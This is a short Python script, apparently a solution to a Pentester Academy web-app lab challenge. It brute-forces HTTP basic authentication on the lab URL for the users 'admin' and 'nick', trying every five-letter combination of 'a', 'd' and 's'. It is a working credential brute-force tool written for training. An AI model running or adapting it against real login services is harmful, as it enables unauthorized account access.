#!/usr/bin/python3.4
# Written by Anirudh Anand (lucif3r) : email - anirudh@anirudhanand.com__author__ = 'lucif3r'

# This is the solution to Pentester Academy's WAP Challenge 2: HTTP basic Authentication Brute-
# Force. The script uses requests library in python 3.4

import itertools
import base64

import requests


def generate_wordlist(words, l):
    """
    :rtype : list
    :param words The string from which words should be made:
    :param l length of the strings:
    :return:
    """
    list_pass = []
    for i in itertools.product(words, repeat=l):
        list_pass.append("".join(i))
    return list_pass


def brute_force(username):
    """


    :param username:  Username for Brute forcing
    """
    url = 'http://pentesteracademylab.appspot.com/lab/webapp/basicauth'
    passwords = generate_wordlist('ads', 5)
    print("wordlist generated. Starting Brute FOrce...")

    for i in passwords:
        header = username+":"+i
        b64 = base64.b64encode(bytes(header, 'UTF-8'))
        b64 = "Basic " + b64.decode('UTF-8')
        headers = {"Authorization": b64}
        response = requests.post(url, headers = headers)

        if response.status_code != 401:
            print('username = ', username, 'Password = ', i)
            break

brute_force('admin')
brute_force('nick')